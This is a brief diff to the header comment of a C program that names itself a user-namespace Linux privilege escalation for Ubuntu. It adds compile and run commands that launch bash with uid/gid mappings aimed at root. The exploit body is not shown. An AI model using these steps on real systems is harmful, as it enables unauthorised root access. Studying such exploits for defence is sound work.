@@ -1,6 +1,8 @@
 /*
 *User-Name-Space-Linux-Privilege-Escalation-Ubuntu
 *经过测试，貌似得用普通用户去执行
+*gcc user.c -o user
+*./user -p -m -U -M '0 1000 1' -G '0 1000 1' bash
 */
 
 #define _GNU_SOURCE
